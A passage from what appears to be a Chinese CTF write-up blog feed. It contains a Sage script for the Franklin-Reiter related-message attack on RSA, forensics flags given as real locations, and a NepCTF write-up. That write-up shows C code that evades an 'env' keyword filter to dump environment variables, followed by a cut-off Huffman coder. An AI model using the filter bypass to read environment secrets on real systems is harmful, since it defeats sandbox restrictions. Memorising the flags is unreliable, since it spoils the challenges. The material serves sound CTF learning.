c2 = 6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931
def is_prime(n):
    if n &amp;lt;= 1:
        return False
    if n &amp;lt;= 3:
        return True
    if n % 2 == 0 or n % 3 == 0:
        return False
    i = 5
    while i * i &amp;lt;= n:
        if n % i == 0 or n % (i + 2) == 0:
            return False
        i += 6
    return True    
def franklinReiter(n,e,c1,c2):
    PR.&amp;lt;x&amp;gt; = PolynomialRing(Zmod(n))
    g1 = (114*x+2333)^int(e) - c1
    g2 = (514*x+4555)^int(e) - c2
    def gcd(g1, g2):
        while g2:
            g1, g2 = g2, g1 % g2
        return g1.monic()
    return -gcd(g1, g2)[0]

for i in range(1024):
    if is_prime(i):
        e = i
        m=franklinReiter(n,e,c1,c2)
        print(long_to_bytes((int(m))))
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;forensics&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#forensics&#34;&gt;#&lt;/a&gt; Forensics&lt;/h1&gt;
&lt;h3 id=&#34;购物之旅&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#购物之旅&#34;&gt;#&lt;/a&gt; 购物之旅&lt;/h3&gt;
&lt;p&gt;SICTF 北京市_顺义区_新顺南大街_北京华联顺义金街购物中心}&lt;/p&gt;
&lt;h3 id=&#34;美女姐姐&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#美女姐姐&#34;&gt;#&lt;/a&gt; 美女姐姐&lt;/h3&gt;
&lt;p&gt;SICTF 福建省福州市仓山区烟台山公园}&lt;/p&gt;
&lt;h3 id=&#34;宝塔镇河妖&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#宝塔镇河妖&#34;&gt;#&lt;/a&gt; 宝塔镇河妖&lt;/h3&gt;
&lt;p&gt;SICTF 山东省济宁市汶上县太子灵踪塔}&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2023/08/13/Nep-wp/</guid>
            <title>Nep__wp</title>
            <link>http://example.com/2023/08/13/Nep-wp/</link>
            <category>wp</category>
            <pubDate>Sun, 13 Aug 2023 21:28:56 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;nepctf-wp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nepctf-wp&#34;&gt;#&lt;/a&gt; NepCTF   wp&lt;/h1&gt;
&lt;p&gt;第一次大型比赛，得到这个成绩也不错了。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/img/wp/image-20230813204701517.png&#34; alt=&#34;image-20230813204701517&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;{ = 空格&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1-misc&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-misc&#34;&gt;#&lt;/a&gt; 1. misc:&lt;/h2&gt;
&lt;h4 id=&#34;1codes&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1codes&#34;&gt;#&lt;/a&gt; 1.codes:&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;环境env要
en\
v绕过下
&lt;/code&gt;&lt;/pre&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;extern&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;en\&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;viron&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;en\&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;viron&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token function&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;%s\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; en\&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;viron&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        i&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;/img/wp/1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2与ai共舞的哈夫曼&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2与ai共舞的哈夫曼&#34;&gt;#&lt;/a&gt; 2. 与 AI 共舞的哈夫曼&lt;/h4&gt;
&lt;p&gt;&lt;u&gt;这就是 hint 嘛，年轻人就要年轻，正经人谁自己写代码&lt;/u&gt;&lt;/p&gt;
&lt;p&gt;AI 代码放进去，自己给 嘻嘻&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;span&gt;n&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; heapq&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; os&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;HuffmanNode&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__init__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; char&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; freq&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;char &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; char&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;freq &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; freq&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;left &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;__lt__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; other&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; self&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;freq &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt; other&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;freq&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;build_huffman_tree&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;frequencies&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    heap &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;HuffmanNode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;char&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; freq&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; char&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; freq &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; frequencies&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;items&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    heapq&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;heapify&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;heap&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;heap&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        left &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; heapq&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;heappop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;heap&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; heapq&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;heappop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;heap&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        merged &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; HuffmanNode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; left&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;freq &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; right&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;freq&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        merged&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;left &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; left&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        merged&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; right&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        heapq&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;heappush&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;heap&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; merged&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; heap&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;build_huffman_codes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;node&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; current_code&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; node &lt;span class=&#34;token keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; node&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;char &lt;span class=&#34;token keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;node&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;char&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; current_code&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    build_huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;node&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;left&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; current_code &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;0&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    build_huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;node&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;right&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; current_code &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;compress&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;input_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; output_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;input_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;rb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    frequencies &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; byte &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span 